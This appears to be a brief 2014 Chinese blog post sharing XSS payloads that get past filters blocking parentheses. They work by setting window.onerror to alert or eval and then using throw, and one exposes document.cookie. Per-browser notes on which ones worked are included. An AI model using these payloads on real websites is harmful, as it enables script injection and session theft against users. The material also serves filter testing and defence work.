title: XSS绕过()检查
date: 2014-12-17 16:09:34
tags: xss
categories: 安全
---

前两天刚刚提交了一个xss漏洞注册了个乌云帐号，激动了好几个小时。感觉终于入了门了，这几个月的书没白看。
对于那些过滤了()的情况，可以用下面的payload来试一下，亲测最新chrome firefox IE：
``` html
<!-- IE work -->
<!-- chrome unCaught -->
<!-- firefox unCauht exception -->
<a onmouseover="javascript:window.onerror=alert;throw document.cookie">xxx</a>
<!-- <img src=x onerror="javascript:window.onerror=alert;throw 1"> -->

<!-- chrome work -->
<!-- IE not work -->
<!-- firefox not work -->
<a onmouseover=javascript:window.onerror=eval;throw'=alert\x28"xss"\x29';>xxxxx</a>

<!-- chrome not work -->
<!-- IE work -->
<!-- firefox not work -->
<a onmouseover=javascript:window.onerror=eval;throw'alert\x28"xss"\x29';>xxxxxxx</a>
```

还有一种是如果能够控制URL属性内容，可以使用data协议来绕过()的检查。
